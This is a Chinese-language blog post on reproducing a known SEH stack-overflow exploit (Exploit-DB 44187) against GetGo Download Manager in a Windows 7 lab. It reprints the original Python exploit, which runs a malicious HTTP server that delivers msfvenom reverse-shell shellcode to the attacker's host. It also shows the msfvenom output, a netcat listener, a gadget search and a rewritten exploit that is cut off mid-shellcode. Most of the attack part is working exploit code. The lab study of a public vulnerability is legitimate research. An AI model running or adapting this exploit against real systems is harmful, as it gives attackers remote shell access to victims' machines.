<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Exploit-db 地址：https://www.exploit-db.com/exploits/44187 0x01 实验环境   软件 版本     被攻击机器 cn_windows_7_enterprise_x86_dvd_x15-70737   攻击机器 kali linux   vmware VMWare  Fusion 专业版 10.1.0 (7370838)   immunity">
<meta name="keywords" content="栈溢出">
<meta property="og:type" content="article">
<meta property="og:title" content="GetGo Download Manager 栈溢出">
<meta property="og:url" content="http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/index.html">
<meta property="og:site_name" content="Yuewei.Liang">
<meta property="og:description" content="Exploit-db 地址：https://www.exploit-db.com/exploits/44187 0x01 实验环境   软件 版本     被攻击机器 cn_windows_7_enterprise_x86_dvd_x15-70737   攻击机器 kali linux   vmware VMWare  Fusion 专业版 10.1.0 (7370838)   immunity">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/35.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/36.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/37.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/38.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/39.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/40.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/41.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/42.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/43.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/44.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/45.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/59.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/46.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/47.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/48.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/49.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/50.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/51.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/52.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/53.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/54.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/55.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/56.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/57.png">
<meta property="og:image" content="http://liangyuewei.com/images/stack_over/58.png">
<meta property="og:updated_time" content="2019-11-16T09:24:39.599Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="GetGo Download Manager 栈溢出">
<meta name="twitter:description" content="Exploit-db 地址：https://www.exploit-db.com/exploits/44187 0x01 实验环境   软件 版本     被攻击机器 cn_windows_7_enterprise_x86_dvd_x15-70737   攻击机器 kali linux   vmware VMWare  Fusion 专业版 10.1.0 (7370838)   immunity">
<meta name="twitter:image" content="http://liangyuewei.com/images/stack_over/35.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>GetGo Download Manager 栈溢出</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2019/11/16/DNSTracer1.9 栈溢出漏洞 CVE-2017-9430/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&text=GetGo Download Manager 栈溢出"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&is_video=false&description=GetGo Download Manager 栈溢出"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=GetGo Download Manager 栈溢出&body=Check out this article: http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&name=GetGo Download Manager 栈溢出&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-实验环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-详细调试步骤"><span class="toc-number">2.</span> <span class="toc-text">0x02 详细调试步骤</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        GetGo Download Manager 栈溢出
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Yuewei.Liang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-11-16T08:59:37.000Z" itemprop="datePublished">2019-11-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/栈溢出/">栈溢出</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>Exploit-db 地址：<a href="https://www.exploit-db.com/exploits/44187" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44187</a></p>
<h3 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h3><table>
<thead>
<tr>
<th>软件</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>被攻击机器</td>
<td>cn_windows_7_enterprise_x86_dvd_x15-70737</td>
</tr>
<tr>
<td>攻击机器</td>
<td>kali linux</td>
</tr>
<tr>
<td>vmware</td>
<td>VMWare  Fusion 专业版 10.1.0 (7370838)</td>
</tr>
<tr>
<td>immunity debugger</td>
<td>1.81</td>
</tr>
<tr>
<td>GetGo Download Manager</td>
<td>5.3.0.2712</td>
</tr>
</tbody>
</table>
<h3 id="0x02-详细调试步骤"><a href="#0x02-详细调试步骤" class="headerlink" title="0x02 详细调试步骤"></a>0x02 详细调试步骤</h3><p>作者提交的 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit Author: bzyo</span></span><br><span class="line"><span class="comment"># Twitter: @bzyo_</span></span><br><span class="line"><span class="comment"># Exploit Title: GetGo Download Manager 5.3.0.2712 - Remote Buffer Overflow (SEH)</span></span><br><span class="line"><span class="comment"># Date: 02-24-2018</span></span><br><span class="line"><span class="comment"># Vulnerable Software: GetGo Download Manager 5.3.0.2712</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://www.getgosoft.com/</span></span><br><span class="line"><span class="comment"># Version: 5.3.0.2712</span></span><br><span class="line"><span class="comment"># Software Link: https://www.exploit-db.com/apps/b26d82eadef93531f8beafac6105ef13-GetGoDMSetup.exe</span></span><br><span class="line"><span class="comment"># Tested On: Windows XP SP3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PoC: </span></span><br><span class="line"><span class="comment"># 1. setup listener 443 on attacking machine</span></span><br><span class="line"><span class="comment"># 2. run script on attacking machine</span></span><br><span class="line"><span class="comment"># 3. open app on victim machine</span></span><br><span class="line"><span class="comment"># 4. go to download</span></span><br><span class="line"><span class="comment"># 5. select new, add http://attackerip to URL, index.html to File Name, and select OK</span></span><br><span class="line"><span class="comment"># 6. check listener, remote shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.0.149"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((host, port))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n[+] listening on %d ..."</span> % port</span><br><span class="line"></span><br><span class="line">bz, addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] connection accepted from %s"</span> % addr[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#jump 6 </span></span><br><span class="line">nseh = <span class="string">"\xeb\x06\x90\x90"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x72d11f39 : pop edi # pop esi # ret 0x04 |  &#123;PAGE_EXECUTE_READ&#125; [msacm32.drv]</span></span><br><span class="line">seh = <span class="string">"\x39\x1f\xd1\x72"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.149 LPORT=443 -b "\x00" -f c</span></span><br><span class="line"><span class="comment">#Payload size: 351 bytes</span></span><br><span class="line">reverse = (</span><br><span class="line"><span class="string">"\xba\x8f\xf6\x0e\x24\xd9\xf7\xd9\x74\x24\xf4\x58\x33\xc9\xb1"</span></span><br><span class="line"><span class="string">"\x52\x31\x50\x12\x83\xc0\x04\x03\xdf\xf8\xec\xd1\x23\xec\x73"</span></span><br><span class="line"><span class="string">"\x19\xdb\xed\x13\x93\x3e\xdc\x13\xc7\x4b\x4f\xa4\x83\x19\x7c"</span></span><br><span class="line"><span class="string">"\x4f\xc1\x89\xf7\x3d\xce\xbe\xb0\x88\x28\xf1\x41\xa0\x09\x90"</span></span><br><span class="line"><span class="string">"\xc1\xbb\x5d\x72\xfb\x73\x90\x73\x3c\x69\x59\x21\x95\xe5\xcc"</span></span><br><span class="line"><span class="string">"\xd5\x92\xb0\xcc\x5e\xe8\x55\x55\x83\xb9\x54\x74\x12\xb1\x0e"</span></span><br><span class="line"><span class="string">"\x56\x95\x16\x3b\xdf\x8d\x7b\x06\xa9\x26\x4f\xfc\x28\xee\x81"</span></span><br><span class="line"><span class="string">"\xfd\x87\xcf\x2d\x0c\xd9\x08\x89\xef\xac\x60\xe9\x92\xb6\xb7"</span></span><br><span class="line"><span class="string">"\x93\x48\x32\x23\x33\x1a\xe4\x8f\xc5\xcf\x73\x44\xc9\xa4\xf0"</span></span><br><span class="line"><span class="string">"\x02\xce\x3b\xd4\x39\xea\xb0\xdb\xed\x7a\x82\xff\x29\x26\x50"</span></span><br><span class="line"><span class="string">"\x61\x68\x82\x37\x9e\x6a\x6d\xe7\x3a\xe1\x80\xfc\x36\xa8\xcc"</span></span><br><span class="line"><span class="string">"\x31\x7b\x52\x0d\x5e\x0c\x21\x3f\xc1\xa6\xad\x73\x8a\x60\x2a"</span></span><br><span class="line"><span class="string">"\x73\xa1\xd5\xa4\x8a\x4a\x26\xed\x48\x1e\x76\x85\x79\x1f\x1d"</span></span><br><span class="line"><span class="string">"\x55\x85\xca\xb2\x05\x29\xa5\x72\xf5\x89\x15\x1b\x1f\x06\x49"</span></span><br><span class="line"><span class="string">"\x3b\x20\xcc\xe2\xd6\xdb\x87\xcc\x8f\xe3\xc2\xa5\xcd\xe3\xed"</span></span><br><span class="line"><span class="string">"\x8e\x5b\x05\x87\xe0\x0d\x9e\x30\x98\x17\x54\xa0\x65\x82\x11"</span></span><br><span class="line"><span class="string">"\xe2\xee\x21\xe6\xad\x06\x4f\xf4\x5a\xe7\x1a\xa6\xcd\xf8\xb0"</span></span><br><span class="line"><span class="string">"\xce\x92\x6b\x5f\x0e\xdc\x97\xc8\x59\x89\x66\x01\x0f\x27\xd0"</span></span><br><span class="line"><span class="string">"\xbb\x2d\xba\x84\x84\xf5\x61\x75\x0a\xf4\xe4\xc1\x28\xe6\x30"</span></span><br><span class="line"><span class="string">"\xc9\x74\x52\xed\x9c\x22\x0c\x4b\x77\x85\xe6\x05\x24\x4f\x6e"</span></span><br><span class="line"><span class="string">"\xd3\x06\x50\xe8\xdc\x42\x26\x14\x6c\x3b\x7f\x2b\x41\xab\x77"</span></span><br><span class="line"><span class="string">"\x54\xbf\x4b\x77\x8f\x7b\x7b\x32\x8d\x2a\x14\x9b\x44\x6f\x79"</span></span><br><span class="line"><span class="string">"\x1c\xb3\xac\x84\x9f\x31\x4d\x73\xbf\x30\x48\x3f\x07\xa9\x20"</span></span><br><span class="line"><span class="string">"\x50\xe2\xcd\x97\x51\x27"</span>)</span><br><span class="line"></span><br><span class="line">fill = <span class="string">"D"</span>*(<span class="number">4055</span> - len(reverse))</span><br><span class="line"></span><br><span class="line">payload = junk + nseh + seh + reverse + fill</span><br><span class="line"></span><br><span class="line">buffer = payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> bz.recv(<span class="number">1000</span>)</span><br><span class="line">bz.send(buffer)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] sending buffer ok\n"</span></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">bz.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>从 exp 可以看出这是个典型的覆盖 SEH 利用。但实验环境与作者的环境有所不同，需要重新找到 pop | pop | ret 地址，以及重新生成 shellcode 。</p>
<p>使用 kali 系统重新生成一段 shellcode，攻击机 IP 地址为：192.168.82.134，被攻击机 IP 地址为192.168.82.140</p>
<p>被攻击机器（windows 7）：</p>
<p><img src="/images/stack_over/35.png" alt="35"></p>
<p>攻击机器：</p>
<p><img src="/images/stack_over/36.png" alt="36"></p>
<p>使用 msfvenom 生成 shellcode : msfvenom -p windows/shell_reverse_tcp LHOST=192.168.82.134 LPORT=8086 -b “\x00” -f python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> bin ./msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.82</span><span class="number">.134</span> LPORT=<span class="number">8086</span> -b <span class="string">"\x00"</span> -f python</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows <span class="keyword">from</span> the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 <span class="keyword">from</span> the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload <span class="keyword">with</span> <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">351</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen <span class="keyword">with</span> final size <span class="number">351</span></span><br><span class="line">Payload size: <span class="number">351</span> bytes</span><br><span class="line">Final size of python file: <span class="number">1712</span> bytes</span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xba\x9b\xdc\x7a\xab\xdb\xd8\xd9\x74\x24\xf4\x5b\x2b"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x0e\x03\xc8\xd2\x98"</span></span><br><span class="line">buf += <span class="string">b"\x5e\x12\x02\xde\xa1\xea\xd3\xbf\x28\x0f\xe2\xff\x4f"</span></span><br><span class="line">buf += <span class="string">b"\x44\x55\x30\x1b\x08\x5a\xbb\x49\xb8\xe9\xc9\x45\xcf"</span></span><br><span class="line">buf += <span class="string">b"\x5a\x67\xb0\xfe\x5b\xd4\x80\x61\xd8\x27\xd5\x41\xe1"</span></span><br><span class="line">buf += <span class="string">b"\xe7\x28\x80\x26\x15\xc0\xd0\xff\x51\x77\xc4\x74\x2f"</span></span><br><span class="line">buf += <span class="string">b"\x44\x6f\xc6\xa1\xcc\x8c\x9f\xc0\xfd\x03\xab\x9a\xdd"</span></span><br><span class="line">buf += <span class="string">b"\xa2\x78\x97\x57\xbc\x9d\x92\x2e\x37\x55\x68\xb1\x91"</span></span><br><span class="line">buf += <span class="string">b"\xa7\x91\x1e\xdc\x07\x60\x5e\x19\xaf\x9b\x15\x53\xd3"</span></span><br><span class="line">buf += <span class="string">b"\x26\x2e\xa0\xa9\xfc\xbb\x32\x09\x76\x1b\x9e\xab\x5b"</span></span><br><span class="line">buf += <span class="string">b"\xfa\x55\xa7\x10\x88\x31\xa4\xa7\x5d\x4a\xd0\x2c\x60"</span></span><br><span class="line">buf += <span class="string">b"\x9c\x50\x76\x47\x38\x38\x2c\xe6\x19\xe4\x83\x17\x79"</span></span><br><span class="line">buf += <span class="string">b"\x47\x7b\xb2\xf2\x6a\x68\xcf\x59\xe3\x5d\xe2\x61\xf3"</span></span><br><span class="line">buf += <span class="string">b"\xc9\x75\x12\xc1\x56\x2e\xbc\x69\x1e\xe8\x3b\x8d\x35"</span></span><br><span class="line">buf += <span class="string">b"\x4c\xd3\x70\xb6\xad\xfa\xb6\xe2\xfd\x94\x1f\x8b\x95"</span></span><br><span class="line">buf += <span class="string">b"\x64\x9f\x5e\x39\x34\x0f\x31\xfa\xe4\xef\xe1\x92\xee"</span></span><br><span class="line">buf += <span class="string">b"\xff\xde\x83\x11\x2a\x77\x29\xe8\xbd\xb8\x06\xa0\xbb"</span></span><br><span class="line">buf += <span class="string">b"\x51\x55\x44\xdb\x37\xd0\xa2\x89\x27\xb5\x7d\x26\xd1"</span></span><br><span class="line">buf += <span class="string">b"\x9c\xf5\xd7\x1e\x0b\x70\xd7\x95\xb8\x85\x96\x5d\xb4"</span></span><br><span class="line">buf += <span class="string">b"\x95\x4f\xae\x83\xc7\xc6\xb1\x39\x6f\x84\x20\xa6\x6f"</span></span><br><span class="line">buf += <span class="string">b"\xc3\x58\x71\x38\x84\xaf\x88\xac\x38\x89\x22\xd2\xc0"</span></span><br><span class="line">buf += <span class="string">b"\x4f\x0c\x56\x1f\xac\x93\x57\xd2\x88\xb7\x47\x2a\x10"</span></span><br><span class="line">buf += <span class="string">b"\xfc\x33\xe2\x47\xaa\xed\x44\x3e\x1c\x47\x1f\xed\xf6"</span></span><br><span class="line">buf += <span class="string">b"\x0f\xe6\xdd\xc8\x49\xe7\x0b\xbf\xb5\x56\xe2\x86\xca"</span></span><br><span class="line">buf += <span class="string">b"\x57\x62\x0f\xb3\x85\x12\xf0\x6e\x0e\x22\xbb\x32\x27"</span></span><br><span class="line">buf += <span class="string">b"\xab\x62\xa7\x75\xb6\x94\x12\xb9\xcf\x16\x96\x42\x34"</span></span><br><span class="line">buf += <span class="string">b"\x06\xd3\x47\x70\x80\x08\x3a\xe9\x65\x2e\xe9\x0a\xac"</span></span><br></pre></td></tr></table></figure>
<p>在攻击机器上使用 nc 监听 8086 端口 nv -lvv -p 8086 </p>
<p><img src="/images/stack_over/37.png" alt="37"></p>
<p>运行 GetGo Download Manager 程序，使用 ImmunityDebugger 附加到进程中。</p>
<p>使用 mona 插件探测 noalrs：</p>
<p><img src="/images/stack_over/38.png" alt="38"></p>
<p>看到有两个地址虽然没有开启 ASLR，但确开启了 SafeSEH。</p>
<p>忽略 SafeSEH,直接在 Getgo.exe 空间中找 pop|pop|ret</p>
<p><img src="/images/stack_over/39.png" alt="39"></p>
<p>发现 GetGo 地址空间存在 “\x00”，从 msfvenom 生成的 shellcode 中得知可能会引起截断</p>
<p>直接在 Kernel32.dll 中寻找 pop|pop|ret </p>
<p><img src="/images/stack_over/40.png" alt="40"></p>
<p>选择地址 0x7602c49c</p>
<p>改写的 exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">"0.0.0.0"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((host, port))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n[+] listening on %d ..."</span> % port</span><br><span class="line"></span><br><span class="line">bz, addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] connection accepted from %s"</span> % addr[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#jump 6 </span></span><br><span class="line">nseh = <span class="string">"\xeb\x06\x90\x90"</span></span><br><span class="line"></span><br><span class="line">seh = <span class="string">"\x9c\xc4\x02\x76"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.82.134 LPORT=8086 -b "\x00" -f python</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xba\x9b\xdc\x7a\xab\xdb\xd8\xd9\x74\x24\xf4\x5b\x2b"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x0e\x03\xc8\xd2\x98"</span></span><br><span class="line">buf += <span class="string">"\x5e\x12\x02\xde\xa1\xea\xd3\xbf\x28\x0f\xe2\xff\x4f"</span></span><br><span class="line">buf += <span class="string">"\x44\x55\x30\x1b\x08\x5a\xbb\x49\xb8\xe9\xc9\x45\xcf"</span></span><br><span class="line">buf += <span class="string">"\x5a\x67\xb0\xfe\x5b\xd4\x80\x61\xd8\x27\xd5\x41\xe1"</span></span><br><span class="line">buf += <span 